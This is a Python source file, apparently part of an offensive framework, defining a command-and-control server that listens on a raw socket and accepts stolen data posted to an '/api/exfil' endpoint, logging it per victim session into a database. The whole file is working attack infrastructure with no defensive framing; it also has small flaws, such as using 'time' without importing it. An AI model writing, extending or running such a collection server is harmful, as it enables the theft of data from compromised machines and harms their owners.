import socket
import threading
import json
import logging
from core.config_manager import ConfigManager
from core.session_manager import SessionManager

class C2Server:
    def __init__(self, config_manager: ConfigManager, session_manager: SessionManager, exfil_engine):
        self.config = config_manager
        self.session_manager = session_manager
        self.exfil_engine = exfil_engine
        self.logger = logging.getLogger(__name__)
        self.running = False
        self.server_socket = None
        self.threads = []
        
        # Server configuration
        self.host = self.config.get('c2.host', '0.0.0.0')
        self.port = self.config.get('c2.port')
        
    def start(self):
        """Start the C2 server"""
        if self.running:
            self.logger.warning("C2 server is already running")
            return False
            
        try:
            self.logger.info("Starting C2 server...")
            self.running = True
            
            # Create server socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            self.logger.info(f"C2 server listening on {self.host}:{self.port}")
            
            # Start accepting connections
            accept_thread = threading.Thread(target=self._accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            self.threads.append(accept_thread)
            
            return True
        except Exception as e:
            self.logger.error(f"Failed to start C2 server: {str(e)}")
            self.running = False
            return False
    
    def stop(self):
        """Stop the C2 server"""
        if not self.running:
            return
            
        self.logger.info("Stopping C2 server...")
        self.running = False
        
        if self.server_socket:
            self.server_socket.close()
            
        # Wait for threads to finish
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=5)
                
        self.logger.info("C2 server stopped")
    
    def _accept_connections(self):
        """Accept incoming connections"""
        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                client_thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket, address)
                )
                client_thread.daemon = True
                client_thread.start()
            except:
                if self.running:
                    self.logger.error("Error accepting connection")
                break
    
    def _handle_client(self, client_socket, address):
        """Handle client connection"""
        try:
            # Receive request
            request = client_socket.recv(4096).decode('utf-8')
            
            # Parse HTTP request
            lines = request.split('\n')
            if len(lines) == 0:
                return
                
            # Extract request line
            request_line = lines[0].strip()
            parts = request_line.split(' ')
            if len(parts) < 3:
                return
                
            method, path, _ = parts
            
            # Route request
            if method == 'POST' and path == '/api/exfil':
                self._handle_exfil(client_socket, request)
            else:
                # Send 404 response
                response = "HTTP/1.1 404 Not Found\r\n\r\n"
                client_socket.send(response.encode('utf-8'))
                
        except Exception as e:
            self.logger.error(f"Error handling client: {str(e)}")
        finally:
            client_socket.close()
    
    def add_endpoint(self, path, handler):
        """Add a custom endpoint handler"""
        if not hasattr(self, 'custom_handlers'):
            self.custom_handlers = {}
        self.custom_handlers[path] = handler
    
    def get_status(self):
        """Get the current status of the C2 server"""
        return {
            'running': self.running,
            'host': self.host,
            'port': self.port,
            'active_threads': len([t for t in self.threads if t.is_alive()]),
            'active_sessions': len(self.session_manager.get_active_sessions())
        }

    def _handle_exfil(self, client_socket, request):
        """Handle exfiltration data"""
        try:
            # Extract request body
            body_start = request.find("\r\n\r\n")
            if body_start == -1:
                return
                
            body = request[body_start+4:]
            data = json.loads(body)
            
            # Store data
            session_id = data.get('session')
            data_type = data.get('type')
            payload = data.get('data')
            
            if not all([session_id, data_type, payload]):
                self.logger.warning("Invalid exfil data received")
                response = "HTTP/1.1 400 Bad Request\r\n\r\n"
                client_socket.send(response.encode('utf-8'))
                return
            
            # Store in database
            self.session_manager.db.insert_collected_data(session_id, data_type, payload)
            
            # Update session
            self.session_manager.update_session(session_id, {'last_seen': time.time()})
            
            # Send success response
            response_data = {'status': 'success'}
            
            response = "HTTP/1.1 200 OK\r\n"
            response += "Content-Type: application/json\r\n"
            response += f"Content-Length: {len(json.dumps(response_data))}\r\n"
            response += "\r\n"
            response += json.dumps(response_data)
            
            client_socket.send(response.encode('utf-8'))
            
            self.logger.info(f"Received {data_type} data from session {session_id}")
            
        except Exception as e:
            self.logger.error(f"Error handling exfil data: {str(e)}")
            # Send error response
            response = "HTTP/1.1 500 Internal Server Error\r\n\r\n"
            client_socket.send(response.encode('utf-8'))
